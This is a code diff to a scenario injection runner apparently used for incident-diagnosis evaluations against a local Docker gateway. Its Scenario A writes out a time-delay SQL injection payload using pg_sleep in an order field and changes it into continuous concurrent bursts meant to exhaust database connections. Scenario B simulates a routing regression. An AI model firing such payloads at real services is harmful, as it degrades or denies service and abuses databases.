@@ -2,10 +2,10 @@
 scenarios.inject – Scenario injection runner for CULPRIT evaluations.
 
 Scenario A (Exploit):
-  Sends a fixed burst to POST /api/orders via gateway with a time-delay SQLi payload
+  Sends a continuous burst to POST /api/orders via gateway with a time-delay SQLi payload
   in `sku` from a single attacker IP.
-  Payload: WIDGET-001' AND (SELECT 1 FROM pg_sleep(8)) IS NOT NULL; --
-  Effect: Raises orders p95 latency to ~8s and generates attack log entries.
+  Payload: WIDGET-001' AND (SELECT 1 FROM pg_sleep(5)) IS NOT NULL; --
+  Effect: Raises orders p95 latency to ~5s and exhausts DB pool connections.
 
 Scenario B (Regression):
   Shifts gateway weights to 100% blue (v1.5.0).
@@ -33,10 +33,10 @@ def start_scenario_a(
     sleep_delay: int = 5,
     attacker_ip: str = "198.51.100.42",
 ) -> Dict[str, Any]:
-    """Inject Scenario A: SQLi time-delay attack burst into Docker gateway."""
+    """Inject Scenario A: SQLi time-delay attack burst into Docker gateway asynchronously."""
     global _scenario_running, _worker_thread
     _scenario_running = True
-    print(f"[Scenario A] Sending exploit requests with {sleep_delay}s time-delay payload to {gateway_url}...")
+    print(f"[Scenario A] Starting async exploit injection against {gateway_url}...")
     url = f"{gateway_url.rstrip('/')}/api/orders"
     sqli_payload = f"WIDGET-001' AND (SELECT 1 FROM pg_sleep({sleep_delay})) IS NOT NULL; --"
     headers = {
@@ -50,22 +50,23 @@ def start_scenario_a(
         "qty": 1,
     }
 
-    def _loop():
+    def _attack_worker():
+        pool = concurrent.futures.ThreadPoolExecutor(max_workers=burst_count)
         while _scenario_running:
             try:
-                requests.post(url, json=body, headers=headers, timeout=sleep_delay + 2)
+                # Concurrent burst
+                futures = [
+                    pool.submit(requests.post, url, json=body, headers=headers, timeout=sleep_delay + 3)
+                    for _ in range(burst_count)
+                ]
+                # Wait briefly then repeat if still running
+                time.sleep(1.0)
             except Exception:
                 pass
-            time.sleep(1.0)
+        pool.shutdown(wait=False)
 
-    # Fire initial burst concurrently
-    with concurrent.futures.ThreadPoolExecutor(max_workers=burst_count) as executor:
-        for _ in range(burst_count):
-            executor.submit(lambda: requests.post(url, json=body, headers=headers, timeout=sleep_delay + 2) if _scenario_running else None)
-
-    if _worker_thread is None or not _worker_thread.is_alive():
-        _worker_thread = threading.Thread(target=_loop, daemon=True)
-        _worker_thread.start()
+    _worker_thread = threading.Thread(target=_attack_worker, daemon=True)
+    _worker_thread.start()
 
     return {
         "scenario": "a_exploit",
@@ -80,23 +81,27 @@ def start_scenario_b(
     gateway_url: str = DEFAULT_GATEWAY_URL,
     num_requests: int = 15,
 ) -> Dict[str, Any]:
-    """Inject Scenario B: 100% blue routing + multi-item N+1 order traffic."""
+    """Inject Scenario B: 100% blue routing + multi-item N+1 order traffic asynchronously."""
     global _scenario_running, _worker_thread
     _scenario_running = True
-    print(f"[Scenario B] Shifting weights to 100% blue and generating heavy multi-item traffic...")
-    admin_url = f"{gateway_url.rstrip('/')}/admin/weights"
+    print(f"[Scenario B] Starting async regression traffic against {gateway_url}...")
+
+    # Shift traffic to 100% blue
+    base = gateway_url.rstrip("/")
     try:
-        requests.post(admin_url, json={"blue": 100, "green": 0}, timeout=5)
+        requests.post(f"{base}/admin/weights", json={"blue": 100, "green": 0}, timeout=5)
     except Exception:
         pass
 
-    orders_url = f"{gateway_url.rstrip('/')}/api/orders"
-    products_url = f"{gateway_url.rstrip('/')}/api/products"
+    orders_url = f"{base}/api/orders"
+    products_url = f"{base}/api/products"
 
-    skus = ["WIDGET-001", "WIDGET-002", "GADGET-001", "GADGET-002", "TOOL-001", "TOOL-002", "PART-001", "PART-002", "PART-003", "PART-004"]
-    multi_items = [{"sku": s, "qty": 1} for s in skus]
+    multi_items = [
+        {"sku": f"SKU-{i:03d}", "qty": 1}
+        for i in range(1, 11)
+    ]
     body = {
-        "customer_id": 1,
+        "customer_id": 2,
         "sku": "WIDGET-001",
         "qty": 1,
         "items": multi_items,
@@ -104,25 +109,21 @@ def start_scenario_b(
 
     def _loop_b():
         count = 0
+        pool = concurrent.futures.ThreadPoolExecutor(max_workers=4)
         while _scenario_running:
             try:
                 if count % 2 == 0:
-                    requests.get(products_url, timeout=6)
+                    pool.submit(requests.get, products_url, timeout=6)
                 else:
-                    requests.post(orders_url, json=body, timeout=10)
+                    pool.submit(requests.post, orders_url, json=body, timeout=8)
                 count += 1
             except Exception:
                 pass
             time.sleep(1.0)
+        pool.shutdown(wait=False)
 
-    # Initial concurrent burst
-    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
-        for _ in range(4):
-            executor.submit(lambda: requests.post(orders_url, json=body, timeout=8) if _scenario_running else None)
-
-    if _worker_thread is None or not _worker_thread.is_alive():
-        _worker_thread = threading.Thread(target=_loop_b, daemon=True)
-        _worker_thread.start()
+    _worker_thread = threading.Thread(target=_loop_b, daemon=True)
+    _worker_thread.start()
 
     return {
         "scenario": "b_regression",
@@ -158,4 +159,4 @@ if __name__ == "__main__":
     elif mode == "reset":
         reset_scenario(gw)
     else:
-        print(f"Unknown mode: {mode}. Use 'a', 'b', or 'reset'")
+        print("Usage: python -m scenarios.inject [a|b|reset]")
